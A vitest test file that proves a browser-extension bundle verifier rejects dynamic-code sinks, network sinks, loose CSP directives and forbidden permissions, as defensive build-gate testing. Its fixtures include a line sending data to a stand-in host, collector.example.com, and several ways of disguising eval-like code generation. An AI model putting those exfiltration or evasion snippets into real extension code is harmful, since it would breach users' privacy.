import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

/**
 * Proves `scripts/verify-bundle.mjs` actually fails on a broken bundle.
 *
 * It is the last gate before a `.crx` ships and the only check that looks at the
 * built output rather than our source, so a hole in it is invisible everywhere
 * else. Each case below builds a deliberately broken bundle in a temp directory
 * and asserts the script rejects it, the same way `tests/security-lint.test.ts`
 * proves each lint rule fires.
 */

const SCRIPT = resolve(import.meta.dirname, '../scripts/verify-bundle.mjs');

const GOOD_MANIFEST = {
  manifest_version: 3,
  name: 'fixture',
  version: '1.0.0',
  content_security_policy: {
    extension_pages: "script-src 'self'; object-src 'none'; connect-src 'none';",
  },
  permissions: ['storage'],
  host_permissions: [],
  optional_permissions: [],
};

const CLEAN_JS = 'export const greet = (name) => `hello ${name}`;\n';

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'verify-bundle-'));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

/** Lays down a bundle, overriding parts of the known-good fixture. */
function bundle({
  manifest = GOOD_MANIFEST,
  js = { 'chunk.js': CLEAN_JS },
}: {
  manifest?: Record<string, unknown> | null;
  js?: Record<string, string>;
} = {}): void {
  if (manifest !== null) {
    writeFileSync(join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2));
  }
  for (const [name, source] of Object.entries(js)) {
    const path = join(dir, name);
    mkdirSync(resolve(path, '..'), { recursive: true });
    writeFileSync(path, source);
  }
}

function verify(): { ok: boolean; output: string } {
  const result = spawnSync(process.execPath, [SCRIPT, dir], { encoding: 'utf8' });
  return { ok: result.status === 0, output: `${result.stdout}${result.stderr}` };
}

describe('a well-formed bundle', () => {
  it('passes', () => {
    bundle();
    expect(verify().ok).toBe(true);
  });

  it('scans nested chunks, not just the top level', () => {
    bundle({ js: { 'chunks/deep/chunk.js': CLEAN_JS } });
    expect(verify().ok).toBe(true);
  });

  it('does not flag an identifier that merely ends in eval', () => {
    bundle({ js: { 'chunk.js': 'export const f = (s) => myeval(s);\n' } });
    expect(verify().ok).toBe(true);
  });
});

describe('dynamic-code sinks in the shipped JS', () => {
  it.each([
    ['a bare eval call', 'export const f = (s) => eval(s);\n'],
    ['eval at the start of a file', 'eval("x");\n'],
    ['window.eval', 'export const f = (s) => window.eval(s);\n'],
    ['globalThis.eval', 'export const f = (s) => globalThis.eval(s);\n'],
    ['self.eval', 'export const f = (s) => self.eval(s);\n'],
    ['eval with whitespace before the call', 'export const f = (s) => window.eval (s);\n'],
  ])('rejects %s', (_name, source) => {
    bundle({ js: { 'chunk.js': source } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('eval(');
  });

  it('rejects new Function', () => {
    bundle({ js: { 'chunk.js': 'export const f = (s) => new Function(s);\n' } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('new Function(');
  });

  // The spelling-based check these replaced was the gap: `const F = Function`
  // reaches the identical sink, matches neither `eval(` nor `new Function(`, and
  // is what a minifier emits anyway. It is also the shape the ModHeader incident
  // took — dynamic codegen inside a dependency, invisible to the project's own
  // scanner. See docs/security.md.
  it.each([
    ['Function aliased to a const', 'const F = Function;\nexport const f = (s) => new F(s);\n'],
    ['Function aliased with let', 'let F = Function;\nexport const f = (s) => new F(s)();\n'],
    ['Function called without new', 'export const f = (s) => Function(s);\n'],
    ['Function passed as a value', 'export const f = (run) => run(Function);\n'],
    ['Function as an object property', 'export const sinks = { make: Function };\n'],
    ['Function.prototype access', 'export const p = Function.prototype;\n'],
    ['Function reached through the global object', 'export const f = (s) => globalThis.Function(s);\n'],
  ])('rejects %s', (_name, source) => {
    bundle({ js: { 'chunk.js': source } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('Function');
  });

  it.each([
    ['codegen through .constructor', 'export const f = (s) => (() => {}).constructor(s);\n'],
    ['computed ["constructor"] access', 'export const f = (o, s) => o["constructor"](s);\n'],
  ])('rejects %s', (_name, source) => {
    bundle({ js: { 'chunk.js': source } });
    expect(verify().ok).toBe(false);
  });

  it('does not flag identifiers that merely contain Function', () => {
    bundle({
      js: {
        'chunk.js':
          'export const asFunction = (x) => x;\nexport const FunctionalHelper = 1;\n' +
          'export const g = (x) => typeof x === "function";\n',
      },
    });
    expect(verify().ok).toBe(true);
  });

  it('points at the code it found rather than only naming the pattern', () => {
    bundle({ js: { 'chunk.js': 'const alias = Function;\nexport const f = (s) => new alias(s);\n' } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('const alias = Function');
    expect(output).toContain('KNOWN_DYNAMIC_CODE');
  });

  it('lets through a match declared benign, and still catches an undeclared one', () => {
    // zod's `Doc.compile()` — declared, read, and unreachable under `jitless`.
    const declared = 'class D{compile(){let e=Function,t=this?.args;return new e(...t)}}\n';
    bundle({ js: { 'chunk.js': declared } });
    expect(verify().ok).toBe(true);

    bundle({ js: { 'chunk.js': `${declared}export const f = (s) => new Function(s);\n` } });
    expect(verify().ok).toBe(false);
  });
});

/**
 * "Nothing leaves this device" is the product's first claim, and the incumbent's
 * collector was in a signed build, not in its source. Reading our own code
 * cannot establish the claim, so the shipped JS is scanned for the sinks — and
 * these cases prove that scan actually fires. See docs/security.md.
 */
describe('network sinks in the shipped JS', () => {
  it.each([
    ['a bare fetch', 'export const f = (u) => fetch(u);\n'],
    ['fetch through the global object', 'export const f = (u) => globalThis.fetch(u);\n'],
    ['XMLHttpRequest', 'export const f = () => new XMLHttpRequest();\n'],
    ['navigator.sendBeacon', 'export const f = (u, d) => navigator.sendBeacon(u, d);\n'],
    ['a WebSocket', 'export const f = (u) => new WebSocket(u);\n'],
    ['an EventSource', 'export const f = (u) => new EventSource(u);\n'],
    ['importScripts', 'importScripts("https://cdn.example.com/x.js");\n'],
  ])('rejects %s', (_name, source) => {
    bundle({ js: { 'chunk.js': source } });
    expect(verify().ok).toBe(false);
  });

  it('names the file and shows the code it found', () => {
    bundle({ js: { 'chunk.js': 'export const send = (d) => fetch("https://collector.example.com", d);\n' } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('chunk.js');
    expect(output).toContain('collector.example.com');
    expect(output).toContain('KNOWN_NETWORK_SINKS');
  });

  it('does not flag identifiers that merely contain a sink name', () => {
    bundle({
      js: {
        'chunk.js':
          'export const prefetched = 1;\nexport const o = { refetch: () => 2 };\n' +
          'export const websocket = "websocket";\n',
      },
    });
    expect(verify().ok).toBe(true);
  });

  it("lets through Vite's modulepreload polyfill, and still catches a real request", () => {
    // The polyfill would fetch this extension's own chunk through a
    // <link rel="modulepreload"> href — declared, read, and unreachable in any
    // browser with native modulepreload support.
    const polyfill =
      'function n(e){if(e.ep)return;e.ep=!0;let n=t(e);fetch(e.href,n)}\n';
    bundle({ js: { 'chunk.js': polyfill } });
    expect(verify().ok).toBe(true);

    bundle({ js: { 'chunk.js': `${polyfill}export const g = (u) => fetch(u);\n` } });
    expect(verify().ok).toBe(false);
  });
});

describe('the manifest surface', () => {
  it.each([
    [
      'a missing script-src directive',
      { extension_pages: "object-src 'none'; connect-src 'none';" },
    ],
    [
      'a missing object-src directive',
      { extension_pages: "script-src 'self'; connect-src 'none';" },
    ],
    [
      'a missing connect-src directive',
      { extension_pages: "script-src 'self'; object-src 'none';" },
    ],
    [
      'unsafe-eval',
      { extension_pages: "script-src 'self' 'unsafe-eval'; object-src 'none'; connect-src 'none';" },
    ],
    [
      'wasm-unsafe-eval',
      {
        extension_pages:
          "script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; connect-src 'none';",
      },
    ],
    [
      'unsafe-inline',
      {
        extension_pages:
          "script-src 'self' 'unsafe-inline'; object-src 'none'; connect-src 'none';",
      },
    ],
  ])('rejects a CSP with %s', (_name, csp) => {
    bundle({ manifest: { ...GOOD_MANIFEST, content_security_policy: csp } });
    expect(verify().ok).toBe(false);
  });

  // `connect-src` is asserted as an allowlist — exactly `'none'` — because the
  // realistic way it widens is a concrete host, and a denylist of scheme tokens
  // would wave that straight through. Chrome polices `script-src` in an MV3
  // manifest itself; it does not police `connect-src` at all.
  it.each([
    ['a concrete https endpoint', "connect-src 'self' https://collector.example.com;"],
    ['a concrete endpoint on its own', 'connect-src https://collector.example.com;'],
    ['a wildcard subdomain of a real host', "connect-src 'none' https://*.example.com;"],
    ['the extension itself', "connect-src 'self';"],
    ['a bare wildcard', "connect-src 'self' *;"],
    ['the https scheme', "connect-src 'self' https:;"],
    ['the http scheme', "connect-src 'self' http:;"],
    ['websockets', "connect-src 'self' wss:;"],
    ['data URLs', "connect-src 'self' data:;"],
    ['blob URLs', "connect-src 'self' blob:;"],
    ['an empty source list', 'connect-src ;'],
  ])('rejects a connect-src of %s', (_name, connectSrc) => {
    bundle({
      manifest: {
        ...GOOD_MANIFEST,
        content_security_policy: {
          extension_pages: `script-src 'self'; object-src 'none'; ${connectSrc}`,
        },
      },
    });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('connect-src');
  });

  it("accepts a connect-src of exactly 'none', whitespace aside", () => {
    bundle({
      manifest: {
        ...GOOD_MANIFEST,
        content_security_policy: {
          extension_pages: "script-src 'self'; object-src 'none';   connect-src   'none'  ;",
        },
      },
    });
    expect(verify().ok).toBe(true);
  });

  it('rejects a missing CSP entirely', () => {
    const { content_security_policy: _dropped, ...rest } = GOOD_MANIFEST;
    bundle({ manifest: rest });
    expect(verify().ok).toBe(false);
  });

  it.each(['host_permissions', 'optional_host_permissions', 'optional_permissions'])(
    'rejects a non-empty %s',
    (key) => {
      bundle({ manifest: { ...GOOD_MANIFEST, [key]: ['https://example.com/*'] } });

      const { ok, output } = verify();
      expect(ok).toBe(false);
      expect(output).toContain(key);
    },
  );

  it('rejects a permission with no row in docs/permissions.md', () => {
    bundle({ manifest: { ...GOOD_MANIFEST, permissions: ['storage', 'bookmarks'] } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('bookmarks');
  });

  it('accepts the permissions this product actually ships', () => {
    bundle({
      manifest: {
        ...GOOD_MANIFEST,
        permissions: ['storage', 'declarativeNetRequestWithHostAccess', 'activeTab'],
        optional_host_permissions: ['*://*/*'],
      },
    });
    expect(verify().ok).toBe(true);
  });

  // These are product guarantees, not style preferences: `debugger` is the
  // permission the incumbent asks every user for at install, and not asking for
  // it is the clearest reason to switch. A build that shipped it would quietly
  // forfeit the pitch, so the check is mechanical.
  it.each([
    ['debugger', 'debugger'],
    ['the implicit-reach declarativeNetRequest variant', 'declarativeNetRequest'],
    ['declarativeNetRequestFeedback', 'declarativeNetRequestFeedback'],
    ['tabs', 'tabs'],
    ['webRequest', 'webRequest'],
  ])('rejects %s outright', (_name, permission) => {
    bundle({ manifest: { ...GOOD_MANIFEST, permissions: ['storage', permission] } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain(`forbidden permission "${permission}"`);
  });

  it('rejects a forbidden permission even when it is only optional', () => {
    bundle({ manifest: { ...GOOD_MANIFEST, optional_permissions: ['debugger'] } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('forbidden permission "debugger"');
  });

  it('rejects <all_urls> anywhere in the manifest', () => {
    bundle({ manifest: { ...GOOD_MANIFEST, optional_host_permissions: ['<all_urls>'] } });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('<all_urls>');
  });

  it('rejects an optional host pattern outside the declared envelope', () => {
    bundle({
      manifest: { ...GOOD_MANIFEST, optional_host_permissions: ['*://*/*', 'file:///*'] },
    });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('optional_host_permissions');
  });

  it('rejects a content script', () => {
    bundle({
      manifest: { ...GOOD_MANIFEST, content_scripts: [{ matches: ['<all_urls>'], js: ['cs.js'] }] },
    });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('content_scripts');
  });

  it('rejects an unreadable manifest', () => {
    bundle({ manifest: null });
    writeFileSync(join(dir, 'manifest.json'), '{ not json');

    expect(verify().ok).toBe(false);
  });
});

describe('a build that did not happen', () => {
  it('fails loudly rather than passing on an empty directory', () => {
    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('did the build run?');
  });

  it('fails when the manifest is there but no JS was emitted', () => {
    bundle({ js: {} });

    const { ok, output } = verify();
    expect(ok).toBe(false);
    expect(output).toContain('did the build run?');
  });
});
